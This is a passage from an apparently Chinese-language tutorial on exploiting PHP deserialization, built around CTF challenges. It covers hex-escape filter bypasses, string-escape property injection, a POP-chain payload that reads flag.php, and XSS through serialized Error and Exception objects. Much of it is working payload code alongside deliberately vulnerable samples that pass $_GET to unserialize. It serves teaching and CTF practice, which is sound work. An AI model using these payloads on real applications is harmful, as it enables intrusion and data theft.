<span class="hljs-meta">?&gt;</span></code></pre>
<h3 id="75-16进制绕过字符的过滤">7.5 16进制绕过字符的过滤</h3>
<pre><code class="hljs plaintext">O:4:"test":2:{s:4:"%00*%00a";s:3:"abc";s:7:"%00test%00b";s:3:"def";}
可以写成
O:4:"test":2:{S:4:"\00*\00\61";s:3:"abc";s:7:"%00test%00b";s:3:"def";}
表示字符类型的s大写时，会被当成16进制解析。
61(16进制)-&gt;97(十进制)-&gt;a(ASCII)</code></pre>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">'admin'</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-number">666</span>;
    }
}
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>{
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">'username'</span>)!==False){
        <span class="hljs-keyword">echo</span>(<span class="hljs-string">"你绕不过！！"</span>.PHP_EOL);
    }
    <span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;
    }
}
<span class="hljs-comment">// 未作处理前</span>
<span class="hljs-variable">$a</span> = <span class="hljs-string">'O:4:"test":1:{s:8:"username";s:5:"admin";}'</span>;
<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$a</span>);
<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>);
<span class="hljs-comment">// 做处理后 \75是u的16进制</span>
<span class="hljs-variable">$a</span> = <span class="hljs-string">'O:4:"test":1:{S:8:"\\75sername";s:5:"admin";}'</span>;
<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$a</span>);
<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>);</code></pre>
<h3 id="76-php反序列化字符逃逸">7.6 PHP反序列化字符逃逸</h3>
<p><strong>1.过滤后字符变多（反序列化后的一个x替换成为两个）</strong></p>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>{
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"x"</span>,<span class="hljs-string">"xx"</span>,<span class="hljs-variable">$str</span>);
}
<span class="hljs-variable">$name</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'name'</span>];
<span class="hljs-variable">$age</span> = <span class="hljs-string">"I am 11"</span>;
<span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$name</span>,<span class="hljs-variable">$age</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">"反序列化字符串："</span>;
<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>));
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"过滤后:"</span>;
<span class="hljs-variable">$old</span> = <span class="hljs-title function_ invoke__">change</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>));
<span class="hljs-variable">$new</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$old</span>);
<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$new</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br/&gt;此时，age=<span class="hljs-subst">$new</span>[1]"</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>正常输出如下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230311145523517.png" alt="image-20230311145523517"></p>
<p>添加一个x看看：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230311145625392.png" alt="image-20230311145625392"></p>
<p>这个就是将GET传入的name中的 x 改为了 xx，正常传入不含x的name值就会正常显示</p>
<p>例如：?name=mao，此时长度为3<br>
如果我们传入maox，正常情况下他的长度就是4，但是经过change函数的替换，变成了abcxx，导致溢出（长度大于4）进而影响下面的反序列化<br>
我们可以利用这一点来实现字符串逃逸</p>
<p>构造：</p>
<pre><code class="hljs scss">?name=abcxxxxxxxxxxxxxxxxxxxx";<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">"whoami"</span>;}</code></pre>
<p><strong>输出如下：</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230311150147558.png" alt="image-20230311150147558"></p>
<p>解释：</p>
<p>当我们构造name时，在abc后写18个x，而且后面 ";i:1;s:4:“flag”;} 也是18的长度；在进行change时，这里的18个x就变成了36个x，刚好符合序列化时的长度，从而造成 ";i:1;s:4:“flag”;} 溢出，前面的"闭合前串，后面的;}闭合反序列化的全过程，而先前存在的$age被舍弃（因为这里数组只有两个元素），不影响反序列化的过程</p>
<p><strong>总之，age变量被我们控制</strong></p>
<p><strong>2.过滤后字符变少(把反序列化后的两个x替换成为一个)</strong></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>{
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"xx"</span>,<span class="hljs-string">"x"</span>,<span class="hljs-variable">$str</span>);
}
<span class="hljs-variable">$arr</span>[<span class="hljs-string">'name'</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'name'</span>];
<span class="hljs-variable">$arr</span>[<span class="hljs-string">'age'</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'age'</span>];
<span class="hljs-keyword">echo</span> <span class="hljs-string">"反序列化字符串："</span>;
<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>));
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"过滤后:"</span>;
<span class="hljs-variable">$old</span> = <span class="hljs-title function_ invoke__">change</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>));
<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$old</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-variable">$new</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$old</span>);
<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$new</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br/&gt;此时，age="</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$new</span>[<span class="hljs-string">'age'</span>];</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230727165639082.png" alt="image-20230727165639082"></p>
<p>构造：</p>
<pre><code class="hljs plaintext">?name=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&amp;age=11";s:3:"age";s:6:"whoami";}</code></pre>
<p>这里的40个x经过滤后就变为了20个x，但是在前面的长度还是40，所以后面的20个字符被”吃掉“</p>
<p>注意 <strong>";s:3:“age”;s:28:</strong> 这一部分本来就有，后面的 <strong>;s:3:“age”;s:6:“whoami”;}</strong> 为我们所构造的<br>
age被我们控制</p>
<p><strong>ctfshow web262</strong></p>
<p>脚本：</p>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">'user'</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">from</span> = <span class="hljs-variable">$f</span>;
        <span class="hljs-variable language_">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;
        <span class="hljs-variable language_">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;
    }
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$msg</span></span>)</span>{
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">'fuck'</span>, <span class="hljs-string">'loveU'</span>, <span class="hljs-variable">$msg</span>);
}

<span class="hljs-variable">$msg</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">message</span>(<span class="hljs-string">'fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:3:"msg";s:1:"b";s:2:"to";s:1:"c";s:5:"token";s:5:"admin";}'</span>,<span class="hljs-string">'b'</span>,<span class="hljs-string">'c'</span>);

<span class="hljs-variable">$msg_1</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$msg</span>);

<span class="hljs-keyword">echo</span> <span class="hljs-variable">$msg_1</span>;


<span class="hljs-variable">$msg_2</span> =<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$msg_1</span>);

<span class="hljs-keyword">echo</span> <span class="hljs-variable">$msg_2</span>;

<span class="hljs-comment">//O:7:"message":4:{s:4:"from";s:310:"loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU";s:3:"msg";s:1:"b";s:2:"to";s:1:"c";s:5:"token";s:5:"admin";}";s:3:"msg";s:1:"b";s:2:"to";s:1:"c";s:5:"token";s:4:"user";}</span>
<span class="hljs-meta">?&gt;</span></code></pre>
<h2 id="0x08-对象注入">0x08 对象注入</h2>
<p>对象注入<br>
当用户的请求在传给反序列化函数 unserialize() 之前没有被正确的过滤时就会产生漏洞。因为PHP允<br>
许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的 unserialize 函数，最终<br>
导致一个在该应用范围内的任意PHP对象注入。<br>
<strong>前提需要满足两个条件</strong></p>
<pre><code class="hljs plaintext">1、unserialize的参数可控。
2、代码里有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函
数。</code></pre>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>{
<span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span> = <span class="hljs-string">"12345"</span>;
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{
<span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test;
}
}
<span class="hljs-variable">$a</span> = <span class="hljs-string">'O:1:"A":1:{s:4:"test";s:5:"23456";}'</span>;
<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<p>脚本结束时会调用**__destruct()函数**，同时会覆盖test变量输出 23456</p>
<h2 id="0x09-pop链简单介绍">0x09 POP链简单介绍</h2>
<p>前面所讲解的序列化攻击更多的是魔术方法中出现一些利用的漏洞，因为自动调用而触发漏洞，但如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来</p>
<p><strong>简单案例MRCTF2020-Ezpop</strong></p>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
    
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>{
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$var</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>{
        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>{ <span class="hljs-comment">//当尝试将对象调用为函数时触发</span>
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);
    }
}
<span class="hljs-variable">$a</span> <span class="hljs-variable">$b</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">'index.php'</span></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'Welcome to '</span>.<span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">"&lt;br&gt;"</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>{ <span class="hljs-comment">//把类当作字符串使用时触发</span>
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="hljs-variable">$this</span>-&gt;source))
    {
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"hacker"</span>;
            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">"index.php"</span>;
    	}
    }
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>{ <span class="hljs-comment">//当调用一个不存在的或者是无法访问的属性的时候被调用</span>
        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();
    }
}
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'pop'</span>])){
    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'pop'</span>]);
}
<span class="hljs-keyword">else</span>{
    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>;
    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>共有3个类，反序列化会调用__wakeup，存在于Show类__wake中的$this-&gt;source可控，也就是Show中$source变量可控</p>
<p>思路：将$source构造成一个对象Show，当$source为一个对象时。就会执行Show类中的__toString<br>
此时将$str指向Test类<br>
$this-&gt;str-&gt;source：取str类中的source值，使这个值自动调用__get<br>
此时将$p构造成new Modifier<br>
return $function() 表示将function当作函数返回<br>
当类变量直接当作函数调用的时候，就会调用魔术方法__invoke<br>
然后将$var构造成读取源码即可</p>
<pre><code class="hljs plaintext">$var = 'php://filter/read=convert.base64-encode/recource=flag.php';</code></pre>
<p>payload：</p>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'memory_limit'</span>,<span class="hljs-string">'-1'</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>{
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$var</span> = <span class="hljs-string">'php://filter/read=convert.base64-</span>
<span class="hljs-string">encode/resource=flag.php'</span>;
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;
        <span class="hljs-variable language_">$this</span>-&gt;str = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();
    }
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Modifier</span>();
}
}
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>(<span class="hljs-string">'aaa'</span>);
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>(<span class="hljs-variable">$a</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));
<span class="hljs-meta">?&gt;</span></code></pre>
<p>来自：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/av4142669">https://www.bilibili.com/video/av4142669</a></p>
<h2 id="0x10-php原生类反序列化利用">0x10 PHP原生类反序列化利用</h2>
<p>我们可以使用以下方法遍历一下PHP的内置类：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$classes</span> = <span class="hljs-title function_ invoke__">get_declared_classes</span>();   <span class="hljs-comment">//返回由已定义类的名字所组成的数组</span>
<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$classes</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$class</span>) {
    <span class="hljs-variable">$methods</span> = <span class="hljs-title function_ invoke__">get_class_methods</span>(<span class="hljs-variable">$class</span>);  <span class="hljs-comment">//返回由类的方法名组成的数组</span>
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$methods</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$method</span>) {
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$method</span>, <span class="hljs-keyword">array</span>(
            <span class="hljs-string">'__destruct'</span>,
            <span class="hljs-string">'__toString'</span>,
            <span class="hljs-string">'__wakeup'</span>,
            <span class="hljs-string">'__call'</span>,
            <span class="hljs-string">'__callStatic'</span>,
            <span class="hljs-string">'__get'</span>,
            <span class="hljs-string">'__set'</span>,
            <span class="hljs-string">'__isset'</span>,
            <span class="hljs-string">'__unset'</span>,
            <span class="hljs-string">'__invoke'</span>,
            <span class="hljs-string">'__set_state'</span>    // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类
        ))) {
            <span class="hljs-keyword">print</span> <span class="hljs-variable">$class</span> . <span class="hljs-string">'::'</span> . <span class="hljs-variable">$method</span> . <span class="hljs-string">"\n"</span>;
        }
    }
}</code></pre>
<pre><code class="hljs php"><span class="hljs-title class_">Exception</span>::<span class="hljs-variable constant_">__wakeup</span>
<span class="hljs-title class_">Exception</span>::<span class="hljs-variable constant_">__toString</span>
<span class="hljs-title class_">ErrorException</span>::<span class="hljs-variable constant_">__wakeup</span>
<span class="hljs-title class_">ErrorException</span>::<span class="hljs-variable constant_">__toString</span>
<span class="hljs-title class_">Error</span>::<span class="hljs-variable constant_">__wakeup</span>
<span class="hljs-title class_">Error</span>::<span class="hljs-variable constant_">__toString</span>
<span class="hljs-title class_">CompileError</span>::<span class="hljs-variable constant_">__wakeup</span>
<span class="hljs-title class_">CompileError</span>::<span class="hljs-variable constant_">__toString</span>
<span class="hljs-title class_">ParseError</span>::<span class="hljs-variable constant_">__wakeup</span>
<span class="hljs-title class_">ParseError</span>::<span class="hljs-variable constant_">__toString</span>
<span class="hljs-title class_">TypeError</span>::<span class="hljs-variable constant_">__wakeup</span>
<span class="hljs-title class_">TypeError</span>::<span class="hljs-variable constant_">__toString</span>
<span class="hljs-title class_">ArgumentCountError</span>::<span class="hljs-variable constant_">__wakeup</span>
<span class="hljs-title class_">ArgumentCountError</span>::<span class="hljs-variable constant_">__toString</span>
<span class="hljs-title class_">ArithmeticError</span>::<span class="hljs-variable constant_">__wakeup</span>
<span class="hljs-title class_">ArithmeticError</span>::<span class="hljs-variable constant_">__toString</span>
<span class="hljs-title class_">DivisionByZeroError</span>::<span class="hljs-variable constant_">__wakeup</span>
<span class="hljs-title class_">DivisionByZeroError</span>::<span class="hljs-variable constant_">__toString</span>
<span class="hljs-title class_">ClosedGeneratorException</span>::<span class="hljs-variable constant_">__wakeup</span>
<span class="hljs-title class_">ClosedGeneratorException</span>::<span class="hljs-variable constant_">__toString</span>
<span class="hljs-title class_">DateTime</span>::<span class="hljs-variable constant_">__wakeup</span>
......</code></pre>
<p>其中常遇到的几个 PHP 原生类有：</p>
<ul>
<li>Error</li>
<li>Exception</li>
<li>SoapClient</li>
<li>DirectoryIterator</li>
<li>SimpleXMLElement</li>
<li>SplFileObject</li>
</ul>
<h3 id="101-errorexception-内置类进行-xss">10.1 Error/Exception 内置类进行 XSS</h3>
<h4 id="error-内置类">Error 内置类</h4>
<ul>
<li>适用于php7版本</li>
<li>在开启报错的情况下</li>
</ul>
<p>Error类是php的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个 <code>__toString()</code> 的方法，常用于PHP 反序列化中。如果有个POP链走到一半就走不通了，不如尝试利用这个来做一个xss，其实我看到的还是有好一些cms会选择直接使用 <code>echo &lt;Object&gt;</code> 的写法，我们都知道当把对象当成字符串的时候它就会自动调用这个方法，而它会将<code>Error</code>以字符串的形式表达出来；那么假如有一个<code>echo</code>将它输出出来，而输出内容如果是我们可以控制的，那我们就可以用<code>&lt;script&gt;</code>标签来执行js代码了</p>
<p>example:</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'whoami'</span>]);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>（这里可以看到是一个反序列化函数，但是没有让我们进行反序列化的类啊，这就遇到了一个反序列化但没有POP链的情况，所以只能找到PHP内置类来进行反序列化）</p>
<p>POC:</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">"&lt;script&gt;alert('xss')&lt;/script&gt;"</span>);
<span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);  
<span class="hljs-meta">?&gt;</span>
<span class="hljs-comment">// 输出：O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A26%3A%22%2Fvar%2Fwww%2Fhtml%2Ftmp%2Ftest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230624192846524.png" alt="image-20230624192846524"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230624193738145.png" alt="image-20230624193738145"></p>
<pre><code class="hljs plaintext">&lt;script&gt;标签直接被嵌入了进去，那里面的内容自然就会被当成js代码执行咯</code></pre>
<p>Exception类和Error类类似，用法原理都差不多，这里就不赘述了，只不过Exception类无论是在php5还是php7<strong>的环境下都能使用</strong></p>
<h4 id="exception-内置类">Exception 内置类</h4>
<ul>
<li>适用于php5、7版本</li>
<li>开启报错的情况下</li>
</ul>
<p>example：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'whoami'</span>]);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">"&lt;script&gt;alert('xss')&lt;/script&gt;"</span>);
<span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);  
<span class="hljs-meta">?&gt;</span>
<span class="hljs-comment">// 输出：O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A26%3A%22%2Fvar%2Fwww%2Fhtml%2Ftmp%2Ftest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</span></code></pre>
